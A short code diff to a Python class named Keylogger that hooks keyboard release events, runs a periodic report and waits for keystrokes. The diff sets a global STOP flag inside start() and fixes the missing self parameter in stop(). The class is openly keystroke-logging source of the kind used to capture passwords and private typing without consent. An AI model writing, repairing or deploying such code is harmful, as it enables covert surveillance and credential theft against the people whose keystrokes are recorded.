@@ -69,11 +69,13 @@ class Keylogger:
         timer.start()
 
     def start(self):
+        global STOP
+        STOP = True
         self.start_dt = datetime.now()
         keyboard.on_release(callback=self.callback)
         self.report()
         keyboard.wait()
 
-    def stop():
+    def stop(self):
         global STOP
         STOP = True
